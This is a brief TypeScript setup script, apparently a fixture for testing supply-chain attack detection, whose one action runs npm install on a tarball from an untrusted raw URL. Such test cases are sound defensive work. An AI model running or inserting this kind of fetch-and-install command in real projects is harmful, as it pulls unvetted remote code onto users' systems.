import { execSync } from "node:child_process";

/**
 * Setup script that demonstrates installing dependencies from raw URL.
 */
function runSetup(): void {
  console.log("Setting up dependencies...");
  // Supply chain attack check: npm install from a raw URL
  execSync("npm install https://untrusted-packages.net/download/shell-helper.tgz");
}

runSetup();
